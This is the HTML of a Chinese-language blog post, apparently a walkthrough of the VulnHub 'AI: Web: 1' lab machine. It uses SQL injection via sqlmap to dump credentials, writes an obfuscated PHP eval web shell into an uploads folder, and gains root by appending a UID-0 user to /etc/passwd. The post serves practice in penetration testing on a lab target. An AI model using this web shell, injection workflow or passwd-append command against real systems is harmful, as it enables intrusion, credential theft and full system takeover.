@@ -1,0 +1,414 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Easy-AI_Web_1 | X1NRI</title>
+  <meta name="author" content="X1NRI">
+  
+  <meta name="description" content="靶机地址：AI: Web: 1 ~ VulnHub
+
+环境搭建额外设置了个跳板机，更接近现实
+入侵扫下端口
+访问网站页面，只有一行字
+dirsearch扫目录只扫出个&amp;#x2F;robots.txt
+User-agent: *
+Disallow: 
+Disallow: /m3diNf0/
+Disallow: /se3reTdir777/uploads/
+访问都是403，拿着 &amp;#x2F;m3diNf0&amp;#x2F; 和 &amp;#x2F;se3reTdir777&amp;#x2F; 继续扫
+扫到  &amp;#x2F;m3diNf0&amp;#x2F;info.php，是一个phpinfo界面这时候想了一下会不会有XXE，但是libxml 2.9.4默认不解析外部实体"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Easy-AI_Web_1"/>
+  <meta property="og:site_name" content="X1NRI"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="X1NRI" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">X1NRI</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/links" title="Subscribe me.">
+			  <i class="fa fa-chain"></i>Links
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Easy-AI_Web_1</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/ai-web-1,353/">AI: Web: 1 ~ VulnHub</a></p>
+</blockquote>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>额外设置了个跳板机，更接近现实<br><img src="/Rxi134_FILE/fc8a796b7c75ecb02200f2bbf5d32d55_MD5.jpeg"></p>
+<h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p>扫下端口<br><img src="/Rxi134_FILE/7b75f0a6b36b30a6433a6ef27c967f90_MD5.jpeg"></p>
+<p>访问网站页面，只有一行字<br><img src="/Rxi134_FILE/938b9d2811e2b344493418a36a37ae63_MD5.jpeg"></p>
+<p>dirsearch扫目录只扫出个&#x2F;robots.txt</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">User-agent: *
+Disallow: 
+Disallow: /m3diNf0/
+Disallow: /se3reTdir777/uploads/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>访问都是403，拿着 &#x2F;m3diNf0&#x2F; 和 &#x2F;se3reTdir777&#x2F; 继续扫</p>
+<p>扫到  &#x2F;m3diNf0&#x2F;info.php，是一个phpinfo界面<br><img src="/Rxi134_FILE/e895abffb33d61ed10fb573347745eea_MD5.jpeg"><br>这时候想了一下会不会有XXE，但是libxml 2.9.4默认不解析外部实体<br><img src="/Rxi134_FILE/8b7947f4287429e7b16227d7f2fdf36f_MD5.jpeg"></p>
+<p>扫  &#x2F;se3reTdir777&#x2F; 只有一个index.php<br><img src="/Rxi134_FILE/20223847dc332295b9557c3db09dfd12_MD5.jpeg"><br>这像是一个通过ID查询用户的系统<br><img src="/Rxi134_FILE/f450c481b54ad47b43c0c91ecfdd8de1_MD5.jpeg"></p>
+<p>与数据库有交集，试试看有没有注入点<br><img src="/Rxi134_FILE/0cd126a50fdd43a0923edea5fbcc2f46_MD5.jpeg"></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">available databases [2]:
+[*] aiweb1
+[*] information_schema<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">Database: aiweb1
+[2 tables]
++------------+
+| user       |
+| systemUser |
++------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">Table: user
+[3 entries]
++----+----------+-----------+
+| id | lastName | firstName |
++----+----------+-----------+
+| 1  | admin    | admin     |
+| 2  | root     | root      |
+| 3  | mysql    | mysql     |
++----+----------+-----------+
+
++----+----------------------------------------------+-----------+
+| id | password                                     | userName  |
++----+----------------------------------------------+-----------+
+| 1  | RmFrZVVzZXJQYXNzdzByZA==                     | t00r      |
+| 2  | TXlFdmlsUGFzc19mOTA4c2RhZjlfc2FkZmFzZjBzYQ== | aiweb1pwn |
+| 3  | TjB0VGhpczBuZUFsczA=                         | u3er      |
++----+----------------------------------------------+-----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>base64解码为</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">FakeUserPassw0rd
+MyEvilPass_f908sdaf9_sadfasf0sa
+N0tThis0neAls0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>我们这个用户有FILE权限<br><img src="/Rxi134_FILE/b3a8df81fe3d1eb20547bb74b882433e_MD5.jpeg"></p>
+<p>要写马得获取绝对路径，一开始想sql shell执行SQL语句但好像没这个权限，不过前面的phpinfo界面可以直接看到绝对路径<br><img src="/Rxi134_FILE/45453dd1d872d71972c09c5a83632bbe_MD5.jpeg"></p>
+<p>有权限写的位置只有 &#x2F;se3reTdir777&#x2F;uploads</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token string">"C:\Penetration<span class="token entity" title="\E">\E</span>xploitTools\Tools\Sqlmap\sqlmap.py"</span> <span class="token parameter variable">-r</span> <span class="token string">"C:\Users\ANONYM~1\AppData\Local\Temp<span class="token entity" title="\\">\\</span>192_168_50_137_80_20240802173240.req"</span> --file-write <span class="token string">"C:\Users\Anonymous\Desktop<span class="token entity" title="\202">\202</span>40802053947.php"</span> --file-dest <span class="token string">"/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/shell.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">GZ0lOZtq</span> <span class="token punctuation">&#123;</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$H2qZ4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/*Z#��h*u@!h4g126854T*/"</span><span class="token operator">.</span><span class="token variable">$H2qZ4</span><span class="token operator">.</span><span class="token string double-quoted-string">"/*Z#��h*u@!h4g126854T*/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">new</span> <span class="token class-name">GZ0lOZtq</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hh'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>蚁剑连接即可<br><img src="/Rxi134_FILE/29dd7c51e3681c1c77d3f4b07a7c9b86_MD5.jpeg"></p>
+<p>在目录下又发现一个连接数据库的文件<br><img src="/Rxi134_FILE/b93740173bc90fc25e9f1ce48c97dbfa_MD5.jpeg"></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">数据库地址 localhost
+账密 aiweb1user:wGuDisZiTkLhuiH_z_zZQXXi
+数据库名称 aiweb1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>先反弹 shell 到跳板机上，我用的是frp反向代理<br><img src="/Rxi134_FILE/cb7046293b85207636403285a4e46edc_MD5.jpeg"></p>
+<p><img src="/Rxi134_FILE/9aff13a14073a24ba411dd1cfeda2acb_MD5.jpeg"></p>
+<p>起一个伪终端，方便回显</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/sh") '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以正常登录mysql<br><img src="/Rxi134_FILE/fde2063f2d5db55cec9646e9af77a0d8_MD5.jpeg"></p>
+<p>进行一些信息搜集，上lineas<br><img src="/Rxi134_FILE/c5784084ac53b01ea3d8577239d190ab_MD5.jpeg"></p>
+<p>本用户对 &#x2F;etc&#x2F;passwd 有写权限<br><img src="/Rxi134_FILE/bf11baf48105c308ba73a35040d28755_MD5.jpeg"><br>创建一个新用户x1nri，密码为123</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> x1nri <span class="token number">123</span>
+<span class="token variable">$1</span><span class="token variable">$x1nri</span><span class="token variable">$RuLBMKXnN1w</span>.xtGk5bIT21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>那么passwd条目为</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">x1nri:$1$x1nri$RuLBMKXnN1w.xtGk5bIT21:0:0:root:/root:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>追加重定向到末尾即可。记得转义$</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"x1nri:\<span class="token variable">$1</span>\<span class="token variable">$x1nri</span>\<span class="token variable">$RuLBMKXnN1w</span>.xtGk5bIT21:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/2dde81a003d363f0b9a2b03fca9564ce_MD5.jpeg"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过该靶机，我学习到了</p>
+<ul>
+<li>更加深入了解了sqlmap</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2024/06/05/Easy-AI_Web_1/" class="leancloud-visitors view" data-flag-title="Easy-AI_Web_1">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2024/06/06/Easy-AI_Web_2/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a type="button" class="btn btn-default disabled">Next<i class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-06-05 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>4</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/靶场/">靶场<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-article-text">环境搭建</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%85%A5%E4%BE%B5"><span class="toc-article-text">入侵</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-article-text">权限提升</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-article-text">总结</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 X1NRI's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
